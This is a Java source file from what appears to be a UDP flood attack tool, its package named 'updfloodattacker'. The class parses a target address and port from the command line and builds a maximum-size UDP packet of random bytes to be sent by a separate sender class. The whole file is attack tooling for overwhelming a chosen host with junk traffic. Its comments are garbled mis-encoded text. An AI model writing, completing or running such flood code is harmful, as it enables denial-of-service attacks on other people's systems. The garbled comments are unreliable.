package clwhthr.updfloodattacker.util;

import java.net.DatagramPacket;
import java.net.InetAddress;
import java.net.Socket;
import java.net.UnknownHostException;
import java.security.SecureRandom;

import clwhthr.updfloodattacker.exception.ParameterAmountException;
import clwhthr.updfloodattacker.main.Main;
import clwhthr.updfloodattacker.util.Debug;

public class ParameterHandler {
	String args[];
	boolean executed = false;
	public ParameterHandler(String args[]) {
		this.args = args.clone();
	}
	/**
	 * 竒パ把计ㄓ承
	 * 把计:
	 * arg 0(ゲ璶) : ip address(琌domain name)
	 * arg 1(ゲ璶)  : port
	 */
	public boolean handle() {
		if(executed) {
			Debug.log("error:executed function");
			return false;
		}else executed = true;
		
		DatagramPacket packet = null;
		PacketSender packetSender = PacketSender.getInstance();
		try {
			if(args.length < 2)throw new ParameterAmountException();
			String ipAddressString = args[0];
			InetAddress address = InetAddress.getByName(ipAddressString);
			int port = Integer.valueOf(args[1]);
			SecureRandom random = new SecureRandom();
			byte buffer[] = new byte[65507];//UDP程byte
			random.nextBytes(buffer);
			packet = new DatagramPacket(buffer, buffer.length, address, port);
		} catch (ParameterAmountException e) {
			if(Debug.isDebugMode)e.printStackTrace();
			Debug.errorArg();
			return false;
		} catch (UnknownHostException e) {
			if(Debug.isDebugMode)e.printStackTrace();
			Debug.errorArg();
			return false;
		} catch (NumberFormatException e) {
			if(Debug.isDebugMode)e.printStackTrace();
			Debug.errorArg();
			return false;
		}catch (Exception e) {
			return false;
		}
		packetSender.setPacket(packet);
		return true;
	}
}
